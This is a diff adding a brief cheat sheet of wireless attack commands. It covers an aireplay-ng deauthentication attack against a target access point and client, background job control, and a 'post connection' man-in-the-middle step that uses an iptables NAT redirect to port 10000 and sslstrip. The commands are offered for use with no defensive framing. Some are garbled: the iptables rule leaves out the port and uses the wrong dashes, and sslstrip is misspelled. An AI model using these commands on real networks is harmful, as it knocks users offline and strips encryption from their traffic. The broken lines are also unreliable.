@@ -1,0 +1,16 @@
+//Deauthentication attacks
+//device will disconnected
+cmd: aireplay-ng --deauth [no] -a [target_access_point_macid] -c [target_mac_id] mon &> /dev/null &
+
+//background process
+cmd: jobs
+
+//to kill jobs
+meth 1 cmd: kill %1 
+meth 2 cmd: killall aireplay-ng 
+
+Post connection attacks
+Cmd: iptables –t nat –A PREROUTING –p tcp –destination-port –j REDIRECT –to-port 10000
+
+After that run simple ssltrip
+Cmd: ssltrip
